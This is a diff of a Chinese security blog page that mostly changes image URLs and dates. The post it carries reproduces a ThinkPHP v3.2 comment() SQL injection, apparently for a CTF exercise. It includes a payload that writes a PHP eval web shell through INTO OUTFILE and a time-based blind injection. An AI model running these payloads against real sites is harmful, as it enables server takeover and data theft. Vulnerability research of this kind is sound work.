@@ -27,24 +27,24 @@
 <meta property="og:site_name" content="Y0ng的博客">
 <meta property="og:description" content="漏洞详情comment函数是用来进行查询注释功能，当执行sql语句时，搭配comment可能存在利用注释进行 写shell或者 时间盲注 漏洞复现控制器写入demo $user &#x3D; M(&#39;Users&#39;)-&gt;comment($id)-&gt;find(intval($id));  payload ?id&#x3D;1*&#x2F; into outfile &amp;quot">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/80b3ae7446c643fca59b073466c53b0c.png#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/e1ebf8f94d424ab4b41cd7d01202e7db.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/695622b2fbba4508b5cbfe6ec1121686.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/fbb9cf64899b44f093df8805aa1ca851.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_19,color_FFFFFF,t_70,g_se,x_16#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/6a900e3398c04e7dacd5f8eaea1e0167.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/b4f0a52457494c11893be3596cd578ae.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20dea038e2c34d8c90e32226f697cf74.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/abbfc9af56d84d579187cc7c6447bdd4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/f7b9b139ca03456aad4dc572f3573578.png#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/5054a83556bc4570b3ce6aa714c236f7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/161b37ef94ea418b8605aff85fd0a56d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/1201c45b1bf8428c817939d04430dc03.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/71f97b7605f14a3daf079aeb2f88436a.png#pic_center">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/80b3ae7446c643fca59b073466c53b0c.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/e1ebf8f94d424ab4b41cd7d01202e7db.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/695622b2fbba4508b5cbfe6ec1121686.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/fbb9cf64899b44f093df8805aa1ca851.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_19,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/6a900e3398c04e7dacd5f8eaea1e0167.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/b4f0a52457494c11893be3596cd578ae.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20dea038e2c34d8c90e32226f697cf74.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/abbfc9af56d84d579187cc7c6447bdd4.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/f7b9b139ca03456aad4dc572f3573578.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/5054a83556bc4570b3ce6aa714c236f7.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/161b37ef94ea418b8605aff85fd0a56d.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/1201c45b1bf8428c817939d04430dc03.png">
+<meta property="og:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/71f97b7605f14a3daf079aeb2f88436a.png">
 <meta property="article:published_time" content="2022-01-09T10:25:52.003Z">
-<meta property="article:modified_time" content="2022-01-09T10:25:35.912Z">
+<meta property="article:modified_time" content="2023-03-16T13:37:28.176Z">
 <meta property="article:author" content="Y0ng">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/80b3ae7446c643fca59b073466c53b0c.png#pic_center">
+<meta name="twitter:image" content="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/80b3ae7446c643fca59b073466c53b0c.png">
 
 <link rel="canonical" href="http://example.com/2022/01/09/ThinkPHP%20v3.2%20comment%20%E6%B3%A8%E9%87%8A%E6%B3%A8%E5%85%A5%20%E5%86%99shell/">
 
@@ -144,7 +144,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">107</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">105</span></a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -224,10 +224,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-01-09 18:25:52 / 修改时间：18:25:35" itemprop="dateCreated datePublished" datetime="2022-01-09T18:25:52+08:00">2022-01-09</time>
+              <time title="创建时间：2022-01-09 18:25:52" itemprop="dateCreated datePublished" datetime="2022-01-09T18:25:52+08:00">2022-01-09</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-16 21:37:28" itemprop="dateModified" datetime="2023-03-16T21:37:28+08:00">2023-03-16</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -263,38 +269,38 @@
 <p>payload</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1*&#x2F; into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;3.php&quot; LINES STARTING BY &#39;&lt;?php eval($_POST[0]);?&gt;&#39;&#x2F;*</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/80b3ae7446c643fca59b073466c53b0c.png#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/80b3ae7446c643fca59b073466c53b0c.png"></p>
 <a id="more"></a>
 
 <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>首先看一下函数调用栈</p>
-<p><img src="https://img-blog.csdnimg.cn/e1ebf8f94d424ab4b41cd7d01202e7db.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/e1ebf8f94d424ab4b41cd7d01202e7db.png"></p>
 <p>开始跟进调试</p>
-<p><img src="https://img-blog.csdnimg.cn/695622b2fbba4508b5cbfe6ec1121686.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/695622b2fbba4508b5cbfe6ec1121686.png"></p>
 <p>跟进comment函数</p>
-<p><img src="https://img-blog.csdnimg.cn/fbb9cf64899b44f093df8805aa1ca851.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_19,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/fbb9cf64899b44f093df8805aa1ca851.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_19,color_FFFFFF,t_70,g_se,x_16"></p>
 <p>给<code>$options加上comment</code>就是我们传入的东西</p>
 <p>中间过程同thinkphp 3.2.3find 注入过程分析相同，往下走到这里select方法</p>
-<p><img src="https://img-blog.csdnimg.cn/6a900e3398c04e7dacd5f8eaea1e0167.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/6a900e3398c04e7dacd5f8eaea1e0167.png"></p>
 <p>跟进，对$options中的model和bind进行操作，不影响</p>
-<p><img src="https://img-blog.csdnimg.cn/b4f0a52457494c11893be3596cd578ae.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/b4f0a52457494c11893be3596cd578ae.png"></p>
 <p>跟进<code>buildSelectSql()</code>开始构建sql语句</p>
-<p><img src="https://img-blog.csdnimg.cn/20dea038e2c34d8c90e32226f697cf74.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/20dea038e2c34d8c90e32226f697cf74.png"></p>
 <p>跟进 <code>parseSql()</code>，分析 $options中的comment</p>
-<p><img src="https://img-blog.csdnimg.cn/abbfc9af56d84d579187cc7c6447bdd4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/abbfc9af56d84d579187cc7c6447bdd4.png"></p>
 <p>跟进</p>
-<p><img src="https://img-blog.csdnimg.cn/f7b9b139ca03456aad4dc572f3573578.png#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/f7b9b139ca03456aad4dc572f3573578.png"></p>
 <p>我们传入的comment被加入到注释中，可以通过闭合前后注释进行注入</p>
 <p>先尝试一下</p>
-<p><img src="https://img-blog.csdnimg.cn/5054a83556bc4570b3ce6aa714c236f7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/5054a83556bc4570b3ce6aa714c236f7.png"></p>
 <p>构造的sql语句注入点在LIMIT 1 后面的地方，也就是说</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT [注入点]</span><br></pre></td></tr></table></figure>
 <p>那么怎么利用这一点？</p>
 <h2 id="堆叠时间盲注"><a href="#堆叠时间盲注" class="headerlink" title="堆叠时间盲注"></a>堆叠时间盲注</h2><p>本地测试可以尝试<code>堆叠注入方式来进行时间盲注</code></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1*&#x2F;;select if(substr(database(),1,1)&#x3D;&#39;s&#39;,sleep(3),0)&#x2F;*</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/161b37ef94ea418b8605aff85fd0a56d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/161b37ef94ea418b8605aff85fd0a56d.png"></p>
 <p>ctfshow 题目环境下</p>
-<p><img src="https://img-blog.csdnimg.cn/1201c45b1bf8428c817939d04430dc03.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/1201c45b1bf8428c817939d04430dc03.png"></p>
 <h2 id="LIMIT后-注入方法"><a href="#LIMIT后-注入方法" class="headerlink" title="LIMIT后 注入方法"></a>LIMIT后 注入方法</h2><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">Mysql下Limit注入方法 | 离别歌 (leavesongs.com)</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/natian-ws/p/7203277.html">Mysql注入点在limit关键字后面的利用方法 - 那天ws </a></p>
 <p>此方法适用于<code>MySQL 5.x中</code>，在 <code>limit语句后面的注入</code></p>
@@ -317,7 +323,7 @@
 <p>给出payload</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?id&#x3D;1*&#x2F; into outfile &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;3.php&quot; LINES STARTING BY &#39;&lt;?php eval($_POST[0]);?&gt;&#39;&#x2F;*</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/71f97b7605f14a3daf079aeb2f88436a.png#pic_center"></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/71f97b7605f14a3daf079aeb2f88436a.png"></p>
 
     </div>
 
@@ -414,7 +420,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">107</span>
+          <span class="site-state-item-count">105</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
